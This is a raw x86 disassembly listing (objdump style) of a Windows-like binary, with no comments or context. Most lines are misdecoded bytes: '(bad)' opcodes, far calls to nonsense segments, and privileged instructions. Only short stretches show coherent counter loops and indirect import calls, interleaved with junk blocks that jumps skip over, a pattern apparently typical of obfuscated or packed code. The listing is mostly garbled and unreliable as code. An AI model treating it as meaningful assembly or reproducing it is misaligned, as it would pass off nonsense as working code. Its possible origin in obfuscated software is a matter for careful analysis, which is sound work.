  4020e6:	idiv   BYTE PTR [edi+0x1efdda0d]
  4020ec:	aas    
  4020ed:	jmp    0x88e6eaac
  4020f2:	daa    
  4020f3:	cmp    esp,edx
  4020f5:	push   eax
  4020f6:	jae    0x402083
  4020f8:	into   
  4020f9:	retf   
  4020fa:	in     eax,dx
  4020fb:	sbb    al,0x2a
  4020fd:	mov    dh,0x2a
  4020ff:	pop    esi
  402100:	pop    ss
  402101:	xchg   edx,eax
  402102:	stos   DWORD PTR es:[edi],eax
  402103:	shl    DWORD PTR [ebx+0x3],1
  402106:	test   al,0x6e
  402108:	mul    DWORD PTR [eax+eax*8+0x41f3130]
  40210f:	div    BYTE PTR [eax]
  402111:	pop    ecx
  402112:	mov    eax,0x4298de12
  402117:	icebp  
  402118:	pusha  
  402119:	outs   dx,DWORD PTR ds:[esi]
  40211a:	(bad)  
  40211b:	fiadd  WORD PTR [ecx+0x2c3b1933]
  402121:	dec    eax
  402122:	cmp    dl,BYTE PTR ds:0xea286bf8
  402128:	cmp    ebp,DWORD PTR [eax]
  40212a:	adc    eax,0xf1f9044b
  40212f:	mov    ah,0x20
  402131:	js     0x4020b5
  402133:	pop    eax
  402134:	xchg   BYTE PTR ds:0xc554fe18,ah
  40213a:	std    
  40213b:	sbb    eax,0xba8b08d9
  402140:	adc    eax,0x90df279e
  402145:	sub    eax,0x3b044b19
  40214a:	jl     0x402168
  40214c:	cmp    al,0x6e
  40214e:	pop    eax
  40214f:	jmp    0xd4ba:0x89bc8f24
  402156:	xor    ecx,eax
  402158:	leave  
  402159:	bound  edi,QWORD PTR [edx-0x2f3c7b79]
  40215f:	mov    eax,0x777419e1
  402164:	in     eax,0x54
  402166:	into   
  402167:	lock call 0x5e348233
  40216d:	fwait
  40216e:	jns    0x40219d
  402170:	push   ss
  402171:	(bad)
  402174:	mov    al,ds:0x67b25ada
  402179:	sbb    ebx,DWORD PTR [ebx-0x2db01d35]
  40217f:	jnp    0x40216b
  402181:	xlat   BYTE PTR ds:[ebx]
  402182:	(bad)  
  402183:	loop   0x40216f
  402185:	ret    0xe84a
  402188:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402189:	add    bh,BYTE PTR [esi-0x3d]
  40218c:	dec    ebx
  40218d:	sbb    DWORD PTR [ebx-0x39],esi
  402190:	add    ch,BYTE PTR [eax+0x4e]
  402193:	push   ds
  402194:	inc    eax
  402195:	xor    al,0x4
  402197:	mov    al,ds:0x7e89050f
  40219c:	in     al,0xf9
  40219e:	mov    edx,edi
  4021a0:	mov    ebx,0x26342cba
  4021a5:	lock fsub QWORD PTR [ebp+0x705c18f1]
  4021ac:	data16 ja 0x402198
  4021af:	aam    0x53
  4021b1:	push   edi
  4021b2:	mul    DWORD PTR [edx-0xdc8cc2e]
  4021b8:	(bad)  ds:0xdabf8ed8
  4021be:	jp     0x402226
  4021c0:	gs dec ecx
  4021c2:	sbb    eax,0x53e682d1
  4021c8:	lea    ebp,[ebx+0x17]
  4021cb:	adc    eax,0x5a36341c
  4021d0:	xchg   ebp,eax
  4021d1:	or     bl,BYTE PTR [edi]
  4021d3:	mov    bh,0xc8
  4021d5:	pop    ds
  4021d6:	fcom   QWORD PTR ds:0x654a253a
  4021dc:	jno    0x402174
  4021de:	add    DWORD PTR [esi],ebp
  4021e0:	sub    al,0x7e
  4021e2:	test   BYTE PTR [ecx-0x4c788a03],0x67
  4021e9:	loope  0x402243
  4021eb:	es cmp al,0x48
  4021ee:	xor    DWORD PTR [eax+0x12f85b37],0xffffffb8
  4021f5:	add    DWORD PTR [edi-0x6a],ecx
  4021f8:	mov    al,0x28
  4021fa:	mov    bl,BYTE PTR [ecx+0x524b4f7d]
  402200:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402201:	xor    DWORD PTR [ecx+0x588c2225],esi
  402207:	rcr    BYTE PTR [ebp-0x59bd22c1],0xcb
  40220e:	and    BYTE PTR [eax],0x65
  402211:	xchg   DWORD PTR [ecx+0x3c],edx
  402214:	or     BYTE PTR [eax+0x6cbf532b],cl
  40221a:	scas   eax,DWORD PTR es:[edi]
  40221b:	jb     0x402262
  40221d:	aaa    
  40221e:	fsubr  DWORD PTR ds:0xa92e9a23
  402224:	mov    edx,DWORD PTR [ecx-0x62]
  402227:	and    BYTE PTR [edx+0x4b],bh
  40222a:	sti    
  40222b:	push   esi
  40222c:	das    
  40222d:	iret   
  40222e:	cmp    DWORD PTR [eax+0x61],edx
  402231:	rol    eax,0x31
  402234:	or     dh,BYTE PTR [eax+0x4e]
  402237:	mov    BYTE PTR [ebx],al
  402239:	jl     0x402208
  40223b:	and    BYTE PTR [eax-0x5e],0x82
  40223f:	dec    edi
  402240:	ss test al,0x77
  402243:	dec    eax
  402244:	retf   
  402245:	mov    dl,0xee
  402247:	stos   DWORD PTR es:[edi],eax
  402248:	mov    ah,0xf2
  40224a:	pop    esp
  40224b:	add    dh,BYTE PTR [ebp-0x9]
  40224e:	push   edi
  40224f:	mov    bh,0x2f
  402251:	int    0x2a
  402253:	jo     0x402220
  402255:	push   edx
  402256:	out    0xab,eax
  402258:	rcr    al,cl
  40225a:	not    ah
  40225c:	mov    ch,0xc7
  40225e:	add    bl,ah
  402260:	and    al,0xb8
  402262:	popf   
  402263:	imul   ebx,DWORD PTR [esi+0x2219a4f0],0x9400e389
  40226d:	sub    ah,BYTE PTR ds:0xa7f46a83
  402273:	ds adc eax,DWORD PTR gs:[ebp-0x57c60a13]
  40227b:	ja     0x4022c2
  40227d:	loopne 0x402226
  40227f:	or     DWORD PTR es:[ebx+esi*2+0x4a],eax
  402284:	aad    0xa0
  402286:	add    DWORD PTR gs:[eax+0x5c6c369d],ecx
  40228d:	or     al,0x5c
  40228f:	mov    ah,0x8e
  402291:	pop    ebp
  402292:	iret   
  402293:	dec    ebp
  402294:	pusha  
  402295:	repnz cmp eax,0x5f62292b
  40229b:	or     ch,al
  40229d:	aas    
  40229e:	xor    DWORD PTR [eax-0x4e],esi
  4022a1:	sbb    BYTE PTR [edx-0x414412b1],0xe3
  4022a8:	adc    al,0x4f
  4022aa:	stos   BYTE PTR es:[edi],al
  4022ab:	add    dl,bl
  4022ad:	ret    0xfed8
  4022b0:	inc    eax
  4022b1:	sub    al,0x8f
  4022b3:	aad    0x6c
  4022b5:	push   esp
  4022b6:	cli    
  4022b7:	push   ds
  4022b8:	aas    
  4022b9:	mov    ?,WORD PTR [esi]
  4022bb:	push   esi
  4022bc:	clc    
  4022bd:	sub    BYTE PTR [ecx+0x32265922],cl
  4022c3:	jl     0x402285
  4022c5:	(bad)  
  4022c6:	dec    ecx
  4022c7:	push   cs
  4022c8:	and    al,0x92
  4022ca:	sub    cl,BYTE PTR [ebx-0x44]
  4022cd:	scas   eax,DWORD PTR es:[edi]
  4022ce:	sub    DWORD PTR [edi],ebp
  4022d0:	xchg   esi,eax
  4022d1:	or     DWORD PTR [ecx+0x327de4bb],edi
  4022d7:	mov    eax,0x25cfff69
  4022dc:	and    BYTE PTR [eax-0x78],al
  4022df:	sahf   
  4022e0:	jns    0x402319
  4022e2:	mov    ds:0x13b3a78f,eax
  4022e7:	jmp    FWORD PTR [edi+0x1b]
  4022ea:	cmp    al,0x63
  4022ec:	retf   0xf397
  4022ef:	sahf   
  4022f0:	test   eax,0xe0ed8f73
  4022f6:	dec    esi
  4022f7:	and    BYTE PTR [edx+0x1c],ch
  4022fa:	les    edi,FWORD PTR [edx-0x1f]
  4022fd:	mul    ah
  4022ff:	in     al,0xbe
  402301:	imul   esi
  402303:	xor    BYTE PTR [eax-0x52db2a1],bh
  402309:	mov    bl,0xe5
  40230b:	in     eax,0xac
  40230d:	mov    edx,0xeaa3cae
  402312:	cmp    bl,ah
  402314:	daa    
  402315:	dec    edx
  402316:	loope  0x402358
  402318:	dec    ecx
  402319:	add    BYTE PTR [ebx+0x42824951],bl
  40231f:	scas   eax,DWORD PTR es:[edi]
  402320:	lods   al,BYTE PTR ds:[esi]
  402321:	xchg   esp,eax
  402322:	or     al,0x3f
  402324:	shl    bh,0x91
  402327:	imul   edx,DWORD PTR [esp+eiz*8+0x7fe5da9b],0x7b98d7a1
  402332:	arpl   WORD PTR [edx],sp
  402334:	push   0x6f772279
  402339:	pop    ebp
  40233a:	pop    ebp
  40233b:	hlt    
  40233c:	inc    ecx
  40233d:	addr16 gs cld 
  402340:	hlt    
  402341:	retf   
  402342:	imul   edi,DWORD PTR [ebp+0x35],0xffffffdc
  402346:	inc    ebp
  402347:	loope  0x4022f0
  402349:	aam    0x14
  40234b:	inc    ebx
  40234c:	jnp    0x4023ad
  40234e:	dec    esp
  40234f:	faddp  st(6),st
  402351:	jmp    0x48b319ad
  402356:	in     al,dx
  402357:	aad    0xec
  402359:	lea    eax,[ebp-0x98]
  40235f:	inc    ebx
  402360:	mov    DWORD PTR [ebp-0x8],eax
  402363:	mov    eax,DWORD PTR [ebp-0x10]
  402366:	xor    DWORD PTR ds:0x433717,ecx
  40236c:	mov    DWORD PTR [ebp-0x24],eax
  40236f:	not    ebx
  402371:	mov    eax,DWORD PTR [ebp-0x1c]
  402374:	or     ebx,DWORD PTR ds:0x4337fb
  40237a:	mov    DWORD PTR [ebp-0x20],eax
  40237d:	and    eax,ebx
  40237f:	mov    ebx,0xf89c853d
  402384:	mov    DWORD PTR [ebp-0x50],ebx
  402387:	mov    eax,DWORD PTR [ebp-0x50]
  40238a:	and    DWORD PTR ds:0x43377b,0x0
  402394:	jmp    0x4023a6
  402399:	mov    ecx,DWORD PTR ds:0x43377b
  40239f:	inc    ecx
  4023a0:	mov    DWORD PTR ds:0x43377b,ecx
  4023a6:	cmp    DWORD PTR ds:0x43377b,0x11
  4023ad:	jae    0x4023dd
  4023b3:	cmp    DWORD PTR ds:0x43377b,0x1b
  4023ba:	jne    0x4023cb
  4023c0:	push   0x4337bf
  4023c5:	call   DWORD PTR ds:0x4121bc
  4023cb:	jmp    0x402399
  4023d0:	movzx  ecx,WORD PTR ds:0x4337f7
  4023d7:	or     DWORD PTR ds:0x433767,ecx
  4023dd:	mov    ecx,DWORD PTR [ebp-0x8]
  4023e0:	xor    eax,esi
  4023e2:	add    eax,edi
  4023e4:	or     DWORD PTR ds:0x433777,0x43383f
  4023ee:	mov    DWORD PTR [ecx],eax
  4023f0:	mov    eax,DWORD PTR [ebp-0x24]
  4023f3:	and    DWORD PTR ds:0x43376f,0x0
  4023fd:	mov    ecx,DWORD PTR ds:0x43376f
  402403:	inc    ecx
  402404:	mov    DWORD PTR ds:0x43376f,ecx
  40240a:	cmp    DWORD PTR ds:0x43376f,0x5
  402411:	jne    0x402436
  402417:	push   DWORD PTR [ebp-0x14]
  40241a:	push   DWORD PTR [ebp-0x18]
  40241d:	push   DWORD PTR [ebp-0x24]
  402420:	push   DWORD PTR [ebp-0x20]
  402423:	push   0x40e6
  402428:	push   0x433910
  40242d:	push   DWORD PTR [ebp-0x10]
  402430:	call   DWORD PTR ds:0x412354
  402436:	cmp    DWORD PTR ds:0x43376f,0x4
  40243d:	jne    0x402450
  402443:	mov    ecx,DWORD PTR ds:0x43376f
  402449:	inc    ecx
  40244a:	mov    DWORD PTR ds:0x43376f,ecx
  402450:	cmp    DWORD PTR ds:0x43376f,0x1d
  402457:	jb     0x4023fd
  40245d:	mov    ecx,DWORD PTR [ebp-0x8]
  402460:	xor    eax,esi
  402462:	add    eax,edi
  402464:	mov    DWORD PTR [ecx+0x4],eax
  402467:	mov    eax,DWORD PTR [ebp-0x2c]
  40246a:	mov    ecx,DWORD PTR [ebp-0x8]
  40246d:	jmp    0x40287b
  402472:	ror    BYTE PTR [ecx-0x3a],cl
  402475:	dec    esi
  402476:	inc    ebp
  402477:	push   ecx
  402478:	push   edx
  402479:	push   ecx
  40247a:	sbb    esp,DWORD PTR [edx-0x32205390]
  402480:	xor    edx,DWORD PTR ds:0x7e7e01ba
  402486:	outs   dx,DWORD PTR ds:[esi]
  402487:	jge    0x402507
  402489:	jle    0x4024ea
  40248b:	scas   al,BYTE PTR es:[edi]
  40248c:	leave  
  40248d:	das    
  40248e:	xchg   edx,eax
  402490:	stos   BYTE PTR es:[edi],al
  402491:	sar    ah,1
  402493:	mul    ebp
  402495:	jbe    0x4024f5
  402497:	ret    0x3a0f
  40249a:	cmp    dl,al
  40249c:	js     0x40244c
  40249e:	ds adc ebx,edx
  4024a1:	jnp    0x40251a
  4024a3:	div    BYTE PTR [ebp-0x7c]
  4024a6:	(bad)  
  4024a8:	mov    BYTE PTR [esi+0x281350a6],bh
  4024ae:	call   0xacf4:0x5be5bf8d
  4024b5:	(bad)  
  4024b6:	jns    0x40244c
  4024b8:	rol    BYTE PTR [edi],cl
  4024ba:	rcr    BYTE PTR [ecx+0x6],1
  4024bd:	arpl   bx,di
  4024bf:	shl    dh,1
  4024c1:	pop    esi
  4024c2:	push   ebp
  4024c3:	xchg   ebp,eax
  4024c4:	mov    edx,esp
  4024c6:	cmp    bl,cl
  4024c8:	sub    esp,ebp
  4024ca:	xor    ebx,DWORD PTR [edx]
  4024cc:	xor    eax,0x30611460
  4024d1:	in     al,0x52
  4024d3:	inc    BYTE PTR [edx-0x5b]
  4024d6:	jl     0x4024aa
  4024d8:	pusha  
  4024d9:	adc    al,0xaa
  4024db:	paddb  mm4,QWORD PTR [edx-0x4b]
  4024df:	mov    cl,0x8e
  4024e1:	ins    BYTE PTR es:[edi],dx
  4024e2:	call   0x171:0xd56edbd2
  4024e9:	pop    ebx
  4024ea:	dec    ebp
  4024eb:	lods   eax,DWORD PTR ds:[esi]
  4024ec:	dec    eax
  4024ed:	push   ss
  4024ee:	mov    ch,0xf
  4024f0:	int3   
  4024f1:	ins    BYTE PTR es:[edi],dx
  4024f2:	call   0x1f3d:0x2de464de
  4024f9:	jl     0x402517
  4024fb:	dec    ecx
  4024fc:	aad    0x71
  4024fe:	adc    bl,0xee
  402501:	dec    eax
  402502:	mov    BYTE PTR [esi-0x7252cb75],bl
  402508:	adc    ebp,DWORD PTR [eax+0x4fa46268]
  40250e:	xlat   BYTE PTR ds:[ebx]
  40250f:	dec    edx
  402510:	or     esp,edx
  402512:	mov    ds:0x4d13b837,al
  402517:	sub    esi,DWORD PTR [esi+0x71bed950]
  40251d:	clc    
  40251e:	or     ebx,edi
  402520:	sub    cl,BYTE PTR [ebx+0x52380adb]
  402526:	fcmovu st,st(6)
  402528:	push   edi
  402529:	ds dec ebx
  40252b:	inc    esi
  40252c:	adc    ebx,DWORD PTR [edx]
  40252e:	and    esp,DWORD PTR [ebp+0x7085635e]
  402534:	and    BYTE PTR [edi+edi*4-0x1d8365bb],ah
  40253b:	scas   eax,DWORD PTR es:[edi]
  40253c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40253d:	jae    0x4025be
  40253f:	and    dl,0x65
  402542:	or     al,0xea
  402544:	sub    BYTE PTR [ebp-0x37370567],bl
  40254a:	and    BYTE PTR [eax],dh
  40254c:	fnsave [eax]
  40254e:	into   
  40254f:	repnz imul ebp,esp,0xfffffff7
  402553:	cmp    dl,0xb8
  402556:	dec    ecx
  402557:	add    BYTE PTR [edi-0x3b980e1c],0xef
  40255e:	je     0x402531
  402560:	lea    edi,[edx-0x5b8acd1]
  402566:	pop    ebp
  402567:	mov    BYTE PTR [eax-0x4000ccf0],0xa9
  40256e:	pusha  
  40256f:	mov    eax,ds:0x80cb3bfd
  402574:	repnz adc DWORD PTR [esi+0x692c8d50],edx
  40257b:	popf   
  40257c:	mov    edi,0x63ba36fc
  402581:	mov    gs,WORD PTR [ebx+ebp*2]
  402584:	or     esi,DWORD PTR ds:0x816eb718
  40258a:	sub    DWORD PTR [ecx-0x43],0x5a
  40258e:	adc    dh,ch
  402590:	pop    edi
  402591:	mov    ebp,0x5e3357cd
  402596:	mov    cl,0x5e
  402598:	das    
  402599:	jmp    0x167e:0xd41d7a03
  4025a0:	cmp    ebx,ebp
  4025a2:	adc    eax,0x3025f06d
  4025a7:	xchg   ecx,eax
  4025a8:	cmp    eax,0x7c6d6f9e
  4025ad:	mov    WORD PTR [eax+0x38c3b0eb],?
  4025b3:	call   0xee81:0x668880db
  4025ba:	pop    ds
  4025bb:	sub    esi,eax
  4025bd:	daa    
  4025be:	cld    
  4025bf:	sub    bl,cl
  4025c1:	(bad)  
  4025c2:	adc    edi,DWORD PTR [esi-0x7dbf51e4]
  4025c8:	test   al,0xde
  4025ca:	jo     0x402561
  4025cc:	repz popf 
  4025ce:	jo     0x4025ce
  4025d0:	jmp    0x402648
  4025d2:	retf   
  4025d3:	dec    edx
  4025d4:	fucomi st,st(3)
  4025d6:	(bad)  
  4025d7:	(bad)  
  4025d9:	xchg   ebx,eax
  4025da:	cdq    
  4025db:	data16 jae 0x402598
  4025de:	xchg   esp,eax
  4025df:	stc    
  4025e0:	(bad)  
  4025e1:	jp     0x40265e
  4025e3:	cmp    eax,0x51c0a91e
  4025e8:	dec    ebp
  4025e9:	lods   eax,DWORD PTR ds:[esi]
  4025ea:	push   es
  4025eb:	pop    ss
  4025ec:	pushf  
  4025ed:	pushf  
  4025ee:	xchg   esp,eax
  4025ef:	(bad)  
  4025f0:	mov    fs,WORD PTR [edi]
  4025f2:	popa   
  4025f3:	loop   0x40258b
  4025f5:	(bad)  
  4025f6:	loopne 0x402661
  4025f8:	retf   0x21ba
  4025fb:	lahf   
  4025fc:	xchg   esi,eax
  4025fd:	test   al,0x24
  4025ff:	(bad)  
  402600:	scas   eax,DWORD PTR es:[edi]
  402601:	inc    edx
  402602:	stc    
  402603:	fsubr  st(7),st
  402605:	mov    dh,0xa9
  402607:	dec    ecx
  402608:	in     al,0x99
  40260a:	jno    0x4025ef
  40260c:	xor    al,0xd
  40260e:	dec    edx
  40260f:	dec    esi
  402610:	daa    
  402611:	daa    
  402612:	jp     0x40267f
  402614:	jb     0x402678
  402616:	push   edi
  402617:	xchg   ebp,eax
  402618:	pop    es
  402619:	sbb    al,0x5
  40261b:	dec    edi
  40261c:	inc    edi
  40261d:	cli    
  40261e:	outs   dx,BYTE PTR ds:[esi]
  40261f:	addr16 lahf 
  402621:	cmp    eax,0x765e5765
  402626:	or     BYTE PTR [ebp-0x392a577c],bh
  40262c:	pop    edx
  40262d:	in     al,0x9a
  40262f:	pop    esi
  402630:	pop    ebp
  402631:	cmp    dl,BYTE PTR [edx-0xc4993f1]
  402637:	adc    BYTE PTR ds:0x2f232ede,al
  40263d:	imul   esp,DWORD PTR [edi+0x47b8c477],0xffffffb9
  402644:	sti    
  402645:	mov    al,bh
  402647:	idiv   BYTE PTR [ebx+0xb7d01f2]
  40264d:	xor    eax,0xe23b54c7
  402652:	pop    edi
  402653:	sbb    al,BYTE PTR [ebp-0xde2b590]
  402659:	rol    BYTE PTR [edx+ebp*1],0xc6
  40265d:	jnp    0x40262f
  40265f:	adc    ebp,ebp
  402661:	xor    eax,0xb67f8cc1
  402666:	lea    edx,[edx-0x24c9283f]
  40266c:	stos   BYTE PTR es:[edi],al
  40266d:	repnz mov edi,0x999074d5
  402673:	fwait
  402674:	or     BYTE PTR [eax+ebx*1+0x171a6280],bl
  40267b:	rol    BYTE PTR [edx],1
  40267d:	jge    0x4026d8
  40267f:	int3   
  402680:	mov    cl,0x9f
  402682:	add    bl,BYTE PTR [eax+0x5d]
  402685:	push   0xefc301b9
  40268a:	or     cl,BYTE PTR ds:0x9fb3b9e7
  402690:	mov    BYTE PTR [eax],0x2f
  402693:	mov    bl,0x98
  402695:	xchg   esp,eax
  402696:	inc    esp
  402697:	jae    0x402695
  402699:	out    dx,eax
  40269a:	test   al,0x66
  40269c:	push   cs
  40269d:	pop    esi
  40269e:	jg     0x402658
  4026a0:	sub    eax,0x2745028
  4026a5:	lock cmp bl,ah
  4026a8:	fbstp  TBYTE PTR [ecx-0x20516af0]
  4026ae:	add    ecx,esp
  4026b0:	fimul  WORD PTR [esi+ebx*4-0x6a62ca6a]
  4026b7:	ins    DWORD PTR es:[edi],dx
  4026b8:	lahf   
  4026b9:	outs   dx,DWORD PTR ds:[esi]
  4026ba:	or     ch,dl
  4026bc:	ds xchg edi,eax
  4026be:	ja     0x4026ec
  4026c0:	jbe    0x4026ea
  4026c2:	in     al,0x4f
  4026c4:	scas   al,BYTE PTR es:[edi]
  4026c5:	rol    BYTE PTR [esi],cl
  4026c7:	aam    0x1c
  4026c9:	or     al,0x9b
  4026cb:	xor    ebx,edx
  4026cd:	lea    edx,[ebx-0x58]
  4026d0:	dec    ecx
  4026d1:	push   es
  4026d2:	lock jae 0x402733
  4026d5:	test   DWORD PTR [ecx],ebx
  4026d7:	inc    esp
  4026d8:	mov    eax,DWORD PTR [ebx]
  4026da:	push   0x27b38843
  4026df:	stc    
  4026e0:	push   ds
  4026e1:	outs   dx,DWORD PTR ds:[esi]
  4026e2:	push   esp
  4026e3:	fsub   st,st(5)
  4026e5:	call   0x8fd2:0x4dc4620b
  4026ec:	push   0xcef95985
  4026f1:	mov    eax,ds:0xa92f4bff
  4026f6:	cmc    
  4026f7:	mov    ah,bh
  4026f9:	and    al,0xf9
  4026fb:	mov    edx,0x26c7da74
  402700:	fs data16 jnp 0x402715
  402704:	xchg   BYTE PTR [eax],ah
  402706:	or     edi,DWORD PTR [esi-0x62]
  402709:	or     BYTE PTR [edx],al
  40270b:	(bad)
  40270e:	in     eax,0x62
  402710:	mov    DWORD PTR [ecx+0x6a],eax
  402713:	or     dh,ch
  402715:	inc    edx
  402716:	fadd   QWORD PTR es:[esi-0x6c]
  40271a:	cmp    al,0xc7
  40271c:	dec    ebp
  40271d:	jae    0x4026af
  40271f:	ds push 0x50
  402722:	fld    TBYTE PTR [eax]
  402724:	mov    esi,0x818834b3
  402729:	sbb    esp,DWORD PTR [ecx]
  40272b:	xchg   esp,eax
  40272c:	(bad)  
  40272d:	outs   dx,DWORD PTR fs:[esi]
  40272f:	js     0x4026d6
  402731:	ins    DWORD PTR es:[edi],dx
  402732:	(bad)  
  402733:	(bad)  
  402735:	inc    ebx
  402736:	add    eax,0x7a3e722b
  40273b:	adc    ecx,DWORD PTR [edi-0x4eae64de]
  402741:	out    dx,al
  402742:	inc    edx
  402743:	sti    
  402744:	loop   0x4027c2
  402746:	push   cs
  402747:	cmc    
  402748:	pop    esi
  402749:	inc    ebx
  40274a:	lahf   
  40274b:	jge    0x402746
  40274d:	xchg   ecx,eax
  40274e:	mov    esi,ebp
  402750:	mov    ss,WORD PTR [eax+0x47e151fb]
  402756:	dec    esi
  402757:	fimul  DWORD PTR [edi+0x77cab8d7]
  40275d:	adc    BYTE PTR [edx-0x33022a1f],0xfe
  402764:	or     ebp,DWORD PTR ds:0x804a1d34
  40276a:	(bad)  
  40276b:	jne    0x40272d
  40276d:	inc    esi
  40276e:	inc    edi
  40276f:	stos   BYTE PTR es:[edi],al
  402770:	fild   QWORD PTR [ecx-0x61639819]
  402776:	jp     0x402716
  402778:	je     0x40275a
  40277a:	and    dl,bl
  40277c:	call   0xdac4:0xb324f410
  402783:	inc    ebx
  402784:	push   edx
  402785:	mov    dl,0x82
  402787:	dec    edx
  402788:	lds    edi,FWORD PTR [esp+ecx*8]
  40278b:	jmp    0x108b:0xa1eaa5cc
  402792:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402793:	cwde   
  402794:	inc    esi
  402795:	sub    DWORD PTR [edi-0x53826b8a],ebx
  40279b:	mov    BYTE PTR [ebx],cl
  40279d:	adc    dl,dl
  40279f:	das    
  4027a0:	(bad)  
  4027a1:	pop    esi
  4027a2:	aam    0xc3
  4027a4:	mov    edx,ebp
  4027a6:	std    
  4027a7:	push   esi
  4027a8:	ret    
  4027a9:	lds    eax,FWORD PTR [edx-0x26]
  4027ac:	xor    eax,0xa7abdfd4
  4027b1:	repnz out dx,eax
  4027b3:	inc    esi
  4027b4:	aam    0x27
  4027b6:	mov    dh,0xbf
  4027b8:	push   ebx
  4027b9:	mov    ebp,0xb8acdc62
  4027be:	shr    DWORD PTR [ebp-0x3ab55fb3],1
  4027c4:	ins    BYTE PTR es:[edi],dx
  4027c5:	mov    BYTE PTR [esp+ebp*1],bh
  4027c8:	adc    al,0x98
  4027ca:	cld    
  4027cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027cc:	sbb    BYTE PTR [edi-0x7a],0xb8
  4027d0:	xchg   esp,eax
  4027d1:	adc    DWORD PTR [esi+0x7e],0x2d0021a3
  4027d8:	ss retf 
  4027da:	hlt    
  4027db:	scas   al,BYTE PTR es:[edi]
  4027dc:	fldenv [ebp+0x5fac4d87]
  4027e2:	fs jae 0x4027cf
  4027e5:	cmp    ebx,DWORD PTR [esp+ebx*1-0x6a2474ad]
  4027ec:	test   eax,0x78be750
  4027f1:	push   es
  4027f2:	imul   esp,DWORD PTR [ebp+0x5b],0x23
  4027f6:	shr    DWORD PTR [edx-0x24],0x2b
  4027fa:	dec    edx
  4027fb:	and    edi,edi
  4027fd:	outs   dx,DWORD PTR ds:[esi]
  4027fe:	push   ebp
  4027ff:	adc    bh,BYTE PTR [eax-0x18c1354e]
  402805:	sbb    al,0x20
  402807:	sti    
  402808:	ffree  st(7)
  40280a:	inc    esp
  40280b:	xchg   BYTE PTR [ebp+0x3230d49d],dh
  402811:	push   ebp
  402812:	arpl   WORD PTR [esi+0x65109a39],si
  402818:	lea    ebp,[edx-0x6b]
  40281b:	xchg   ch,bh
  40281d:	xchg   ecx,eax
  40281e:	cld    
  40281f:	mov    al,0x8a
  402821:	adc    DWORD PTR [eax],eax
  402823:	and    edx,DWORD PTR [ebx]
  402825:	and    ch,dl
  402827:	mov    esp,es
  402829:	or     ebx,DWORD PTR [esi-0x71]
  40282c:	retf   
  40282d:	cmp    ebp,edx
  40282f:	cmp    BYTE PTR [esi],ch
  402831:	mov    bl,0x69
  402833:	jecxz  0x40282e
  402835:	shl    esi,0xa9
  402838:	mov    ecx,0x286dff35
  40283d:	inc    esp
  40283e:	out    0xab,eax
  402840:	int    0xb4
  402842:	outs   dx,DWORD PTR ds:[esi]
  402843:	outs   dx,BYTE PTR ds:[esi]
  402844:	push   es
  402845:	int3   
  402846:	and    DWORD PTR [esi+0x2b],0x6449fe7
  40284d:	ins    DWORD PTR es:[edi],dx
  40284e:	sub    ch,BYTE PTR [ebx-0x7f5a834f]
  402854:	mov    ds:0xb2cc7b9c,eax
  402859:	stos   BYTE PTR es:[edi],al
  40285a:	retf   
  40285b:	pop    ecx
  40285c:	das    
  40285d:	pop    edi
  40285e:	out    dx,al
  40285f:	or     DWORD PTR [edi-0x35cb881c],edi
  402865:	mov    bl,bh
  402867:	mov    ecx,0x46320def
  40286c:	(bad)  
  40286d:	int3   
  40286e:	sbb    DWORD PTR ds:0x68999cfc,0x40987039
  402878:	imul   eax,DWORD PTR [ebx+0x8418980],0x8bd0458b
  402882:	dec    ebp
  402883:	clc    
  402884:	mov    DWORD PTR [ecx+0xc],eax
  402887:	mov    eax,DWORD PTR [ebp-0x34]
  40288a:	mov    ecx,DWORD PTR [ebp-0x8]
  40288d:	mov    DWORD PTR [ecx+0x10],eax
  402890:	mov    eax,eax
  402892:	mov    eax,DWORD PTR [ebp-0x20]
  402895:	xor    eax,esi
  402897:	add    eax,edi
  402899:	je     0x402cd8
  40289f:	lea    eax,[ebp-0x98]
  4028a5:	push   eax
  4028a6:	mov    eax,DWORD PTR [ebp-0x1c]
  4028a9:	xor    eax,esi
  4028ab:	add    eax,edi
  4028ad:	push   eax
  4028ae:	mov    eax,DWORD PTR [ebp-0x18]
  4028b1:	jmp    0x402cbf
  4028b6:	xor    eax,DWORD PTR [ebx]
  4028b8:	mov    dl,0xa
  4028ba:	mov    dl,0xab
  4028bc:	mov    bl,0x23
  4028be:	sbb    al,0x86
  4028c0:	adc    al,BYTE PTR [ebx+0x1efe13d5]
  4028c6:	stos   DWORD PTR es:[edi],eax
  4028c7:	or     eax,0x7d6f7e7e
  4028cc:	jle    0x40294c
  4028ce:	sahf   
  4028cf:	ret    
  4028d0:	adc    esi,DWORD PTR [ecx+0x7d]
  4028d3:	bts    ebp,eax
  4028d6:	and    ebx,eax
  4028d8:	test   al,0x59
  4028da:	dec    ebx
  4028db:	and    ebx,DWORD PTR [ebx-0x2e]
  4028de:	leave  
  4028df:	jne    0x402867
  4028e1:	jecxz  0x40287e
  4028e3:	cdq    
  4028e4:	mov    ah,0xe9
  4028e6:	push   0x45e5bdd0
  4028eb:	xlat   BYTE PTR ds:[ebx]
  4028ec:	iret   
  4028ed:	push   ebx
  4028ee:	retf   
  4028ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4028f0:	cmp    DWORD PTR [esi-0x5b],edx
  4028f3:	ja     0x4028af
  4028f5:	push   eax
  4028f6:	or     DWORD PTR [ecx-0x637ef0e6],ebp
  4028fc:	fisttp DWORD PTR [ebx+0x61704e90]
  402902:	aad    0xf4
  402904:	test   DWORD PTR [edx-0x31],ecx
  402907:	push   edx
  402908:	mov    ah,0x29
  40290a:	inc    eax
  40290b:	push   edi
  40290c:	pop    ebp
  40290d:	leave  
  40290e:	or     al,0x33
  402910:	mov    al,0xbd
  402912:	leave  
  402913:	and    al,0x24
  402916:	fisttp DWORD PTR es:[edi]
  402919:	stos   BYTE PTR es:[edi],al
  40291a:	lea    ebp,[edi]
  40291c:	sahf   
  40291d:	xor    DWORD PTR [ecx+0x5217d535],eax
  402923:	loope  0x40290e
  402925:	push   cs
  402926:	lea    edx,[ecx]
  402928:	mov    bl,0xda
  40292a:	popa   
  40292b:	xchg   ecx,eax
  40292c:	lea    ebx,[ecx-0x3f0ec2fb]
  402932:	push   ebx
  402933:	or     esi,DWORD PTR [ebx+0x56]
  402936:	cmp    edi,ebp
  402938:	daa    
  402939:	push   cs
